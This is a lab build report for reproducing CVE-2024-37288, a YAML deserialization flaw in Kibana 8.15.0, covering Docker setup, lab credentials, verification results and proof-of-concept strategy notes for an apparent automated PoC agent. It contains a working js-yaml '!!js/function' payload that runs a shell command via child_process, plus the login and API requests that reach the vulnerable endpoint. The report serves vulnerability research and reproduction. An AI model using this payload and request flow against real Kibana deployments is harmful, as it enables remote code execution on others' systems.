# Lab Build Report: CVE-2024-37288

## Lab Architecture

The lab reproduces CVE-2024-37288, an insecure YAML deserialization vulnerability in Kibana 8.15.0's Integration Assistant plugin. The lab uses official Elastic Docker images — no source build required.

### Container Topology

| Container | Image | Role |
|---|---|---|
| `cve-2024-37288-es` | `docker.elastic.co/elasticsearch/elasticsearch:8.15.0` | Elasticsearch backend (single-node, trial license) |
| `cve-2024-37288-kibana` | Custom (based on `docker.elastic.co/kibana/kibana:8.15.0`) | Vulnerable Kibana with Integration Assistant enabled |
| `cve-2024-37288-setup` | Custom (based on `curlimages/curl:8.9.1`) | One-shot initialization (trial license activation) |

### Network Layout

- `lab-net` — Internal bridge network for ES ↔ Kibana communication

## Container Details

### Elasticsearch (`cve-2024-37288-es`)
- **Image**: `docker.elastic.co/elasticsearch/elasticsearch:8.15.0`
- **Version**: 8.15.0
- **Config**: Single-node, security enabled, TLS disabled (HTTP + transport)
- **License**: Trial (auto-generated, active)
- **Credentials**: `elastic` / `changeme`
- **Accessible at**: `http://localhost:9200` (mapped port) or `http://cve-2024-37288-es:9200` (from lab-net)
- **Health**: Healthy (green cluster)

### Kibana (`cve-2024-37288-kibana`)
- **Image**: Custom `cve-2024-37288-kibana:latest` (Dockerfile.kibana)
- **Base**: `docker.elastic.co/kibana/kibana:8.15.0`
- **Version**: 8.15.0
- **Custom Config** (`kibana.yml`):
  - `elasticsearch.username: kibana_system` / `elasticsearch.password: changeme`
  - `xpack.integration_assistant.enabled: true` — Enables the vulnerable plugin
  - `xpack.encryptedSavedObjects.encryptionKey` — Set for connector secret storage
  - `xpack.security.authc.providers.basic.basic1.order: 0` — Enables basic auth login
- **Accessible at**: `http://localhost:5601` (mapped port) or `http://cve-2024-37288-kibana:5601` (from lab-net)
- **Health**: Healthy, all plugins available

### Setup (`cve-2024-37288-setup`)
- **Purpose**: One-shot container to activate trial license and verify setup
- **Status**: Exited (0) — completed successfully

## Build Status

| Component | Status | Notes |
|---|---|---|
| Elasticsearch 8.15.0 | ✅ SUCCESS | Official image, no build needed |
| Kibana 8.15.0 | ✅ SUCCESS | Custom image with kibana.yml overlay |
| Setup | ✅ SUCCESS | Trial license activated |

### Workarounds Applied
1. **Config overlay**: A custom Dockerfile (`Dockerfile.kibana`) copies `kibana.yml` into the image at build time rather than volume-mounting it.
2. **Kibana refuses `elastic` superuser**: Kibana 8.15.0 blocks `elasticsearch.username: elastic` for its ES connection. Solved by using `kibana_system` user and setting its password via the ES API.
3. **Basic auth provider not enabled**: Kibana 8.15.0 requires explicit `xpack.security.authc.providers` configuration. Added `basic.basic1` provider to `kibana.yml`.

## Start/Stop Commands

```bash
# Start the lab
docker compose build
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs

# Stop the lab
docker compose down
```

## Verification Evidence

### 1. Elasticsearch Running (v8.15.0)
```json
{"version": "8.15.0", "cluster": "cve-2024-37288-lab"}
```

### 2. Kibana Running and Available
```json
{"overall": "available"}
```

### 3. Trial License Active
```json
{"type": "trial", "status": "active"}
```

### 4. Authentication Working
- Login endpoint: `POST /internal/security/login`
- Provider: `basic.basic1`
- Credentials: `elastic` / `changeme`
- Session: Cookie-based (`sid=<token>`)

### 5. Integration Assistant API Endpoint Active
```
POST /api/integration_assistant/ecs
Headers: kbn-xsrf: true, elastic-api-version: 1, Content-Type: application/json
```
Response to test request with nonexistent connector:
```json
{"statusCode": 400, "error": "Bad Request", "message": "Saved object [action/fake-id] not found"}
```
This confirms the route is registered, the plugin is loaded, and it processes requests (400 = valid route, bad input; 404 would mean route not found).

### 6. Vulnerable js-yaml Confirmed
- **js-yaml version**: 3.14.1 (in `/usr/share/kibana/node_modules/js-yaml/`)
- **Vulnerable `load()` function**: Available, supports `!!js/function` tag
- **RCE demonstrated** inside container:
  ```
  RCE via load(): kibana  (output of `whoami`)
  uid=1000(kibana) gid=1000(kibana) groups=1000(kibana),0(root)  (output of `id`)
  ```
- **Fix verified**: `safeLoad()` correctly rejects `!!js/function` with error: `unknown tag !<tag:yaml.org,2002:js/function>`

### 7. Vulnerable Code Path Confirmed
- **File**: `/usr/share/kibana/node_modules/@kbn/integration-assistant-plugin/server/graphs/ecs/pipeline.js`
- **Line 7**: `var _jsYaml = require("js-yaml");` — imports vulnerable library
- **Line 142**: `(0, _jsYaml.load)(renderedTemplate);` — the unsafe deserialization call

## Connectivity

| Target | URL |
|---|---|
| Elasticsearch | `http://localhost:9200` |
| Kibana | `http://localhost:5601` |

## Authentication Flow for PoC

```bash
# 1. Login
curl -s -c /tmp/cookies.txt -X POST "http://localhost:5601/internal/security/login" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{"providerType":"basic","providerName":"basic1","currentURL":"http://localhost:5601/login","params":{"username":"elastic","password":"changeme"}}'

# 2. Extract session cookie
SID=$(grep sid /tmp/cookies.txt | awk '{print $NF}')

# 3. Use session for API calls
curl -b "sid=${SID}" -H "kbn-xsrf: true" -H "elastic-api-version: 1" \
  -H "Content-Type: application/json" \
  -X POST "http://localhost:5601/api/integration_assistant/ecs" \
  -d '{"packageName":"test","dataStreamName":"test","rawSamples":["{}"],"connectorId":"<connector-id>"}'
```

## PoC Strategy Notes

### Approach A — Standalone js-yaml PoC (Recommended)
Demonstrate the deserialization primitive directly using js-yaml 3.14.1 inside the Kibana container:
```bash
docker exec cve-2024-37288-kibana /usr/share/kibana/node/glibc-217/bin/node -e '
const yaml = require("js-yaml");
const payload = "test: !!js/function >\n  function() { return require(\"child_process\").execSync(\"id\").toString().trim(); }";
const result = yaml.load(payload);
console.log("RCE:", result.test());
'
```

### Approach B — End-to-End via API
Requires setting up an AI connector (OpenAI or Bedrock) — real or mocked — to influence the YAML template output. The Integration Assistant API endpoint is confirmed active at `/api/integration_assistant/ecs`.

### Node.js Binary Path
The Kibana container's Node.js binary is at:
```
/usr/share/kibana/node/glibc-217/bin/node
```
(Not in the standard PATH — use full path for `docker exec`)

## Known Issues

1. **Trial license expiry**: The trial license expires 30 days after activation. Re-run the setup container or call `POST /_license/start_trial?acknowledge=true` to reactivate (only works once).
2. **No AI connector**: The lab does not pre-configure an AI connector. The PoC agent will need to either:
   - Use the standalone js-yaml approach (no connector needed)
   - Create a mock AI connector for end-to-end testing
3. **Memory**: ES is configured with 512MB heap. Increase `ES_JAVA_OPTS` if needed for stability.

## Lab Files

```
docker-compose.yml       # Service orchestration
Dockerfile.kibana        # Custom Kibana image with config
Dockerfile.setup         # Setup container image
kibana.yml               # Kibana config (integration_assistant enabled, auth configured)
setup.sh                 # Trial license activation script
```
